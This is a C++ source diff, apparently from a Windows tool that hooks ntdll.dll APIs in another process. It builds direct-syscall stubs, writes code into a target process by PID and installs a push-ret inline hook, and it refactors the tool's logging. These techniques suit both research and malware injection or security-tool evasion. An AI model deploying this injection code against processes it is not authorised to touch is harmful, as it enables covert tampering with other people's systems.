@@ -1,7 +1,6 @@
-#include "debug.hpp"
 #include "helpers.hpp"
 #include "shellcodePrepare.hpp"
-extern uintptr_t g_nosyFunction;
+extern size_t copyCodeSize;
 
 __attribute__((naked)) void directSysCall()
 {
@@ -32,32 +31,34 @@ __attribute__((naked)) void directSysCall()
     asm("push rax");
 }
 
-void replaceInFunction(string &sFunc, DWORD dwSyscall, uintptr_t baseMemory)
+string createDirectSysCall(DWORD dwSyscall)
 {
     string sReplacement((char*) directSysCall, 0x400); //Who said C is not beautiful? Initialize an std::string with a char pointer static casted from a function pointer. IDDQD.
     sReplacement = sReplacement.substr(0, sReplacement.find("PPPP")); //Here we have the direct syscall function.
     string sSysCall((char*)(&dwSyscall), sizeof(dwSyscall)); //Another IDDQD moment.
     replacestr(sReplacement, "HHHH", sSysCall); //Replace the syscall number with the correct one.
-    replaceCallIfValid(sFunc, baseMemory, sReplacement);
+    return sReplacement;
 }
 
 bool hookAPIDirectSyscall(DWORD dwPid, LPVOID lpShellCodeFunc, string apiName)
 {
-    string sFunc((char*)lpShellCodeFunc, 0x1000);
+    GENERAL(cout << "Log level = " << logLevel << endl);
+    string sFunc((char*)lpShellCodeFunc, copyCodeSize);
     DWORD dwSysCall = 0;
     if(getSyscallNumber(apiName, &dwSysCall))
     {
-        replaceIATCalls(sFunc, (uintptr_t)lpShellCodeFunc);
-        replaceInFunction(sFunc, dwSysCall, (uintptr_t)lpShellCodeFunc);
+        string sDirectSysCall = createDirectSysCall(dwSysCall);
+        uint32_t entryOffset = handleLocalCalls(sFunc, (uintptr_t)lpShellCodeFunc);
+        placeJumpToEntry(sFunc, &entryOffset);
+        replaceIATCalls(sFunc, ((uintptr_t)lpShellCodeFunc), entryOffset);
+        handleOriginalCall(sFunc, sDirectSysCall);
         uintptr_t targetApi = (uintptr_t) GetProcAddress(LoadLibrary("ntdll.dll"), apiName.c_str()); //Get API address.
         uintptr_t targetHook = writeToProcess(dwPid, sFunc, 0);
         if(targetHook)
         {
-            #ifdef VERBOSE
-            cout << "Hooking " << apiName << " from ntdll.dll (0x" << (hex) << targetApi << ")." << endl;
-            cout << "Syscall number 0x" << (hex) << dwSysCall << endl;
-            cout << "Replacing function in 0x" << (hex) << targetHook << endl;
-            #endif // DEBUG
+            GENERAL(cout << "Hooking " << apiName << " from ntdll.dll (0x" << (hex) << targetApi << ")." << endl);
+            INFO(cout << "Syscall number 0x" << (hex) << dwSysCall << endl);
+            INFO(cout << "Replacing function in 0x" << (hex) << targetHook << endl);
             unsigned char szHook[] = {0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0xC3, 0xC3, 0xC3};
             memcpy(szHook+2, &targetHook, sizeof(uintptr_t));
             string sHook((char*)szHook, sizeof(szHook)-1);
